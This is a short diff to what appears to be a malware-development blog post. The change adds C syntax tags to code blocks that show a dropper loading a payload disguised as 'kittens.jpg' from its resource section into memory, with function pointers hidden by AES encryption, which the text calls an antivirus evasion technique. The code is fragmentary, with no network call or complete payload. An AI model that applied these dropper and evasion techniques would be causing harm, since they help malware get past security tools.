@@ -65,14 +65,14 @@ Great! our devil jpg is ready. Now we have to modify our dropper to extract the 
 
 ## the Dropper
 Let's change the name of the payload as a recource by the file ```resources.rc``` to ```kittens.jpg```
-```
+```c
 #include "resources.h"
 
 IMAGE RCDATA kittens.jpg
 ```
 The dropper has a section where the payload is loaded as a resource with the ```FindResourceA``` and ```LoadResource``` functions, its lenght is calculated with ```SizeofResource``` then it is loaded in memory with the ```VirtualAlloc``` function
 
-```
+```c
 ...
 // Extract payload from resources section
     res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
@@ -86,7 +86,7 @@ The dropper has a section where the payload is loaded as a resource with the ```
 ```
 In the code trunk below the Windows functions are called as pointers because of AES encryption as saw in the previous post, this techniques works very well as an AV evasion technique so we can reuse it. Now we have to change this section like this
 
-```
+```c
 // Load resources section
     res = pFindResourceA(NULL, MAKEINTRESOURCE(IMAGE), RT_RCDATA);
     resHandle = pLoadResource(NULL, res);
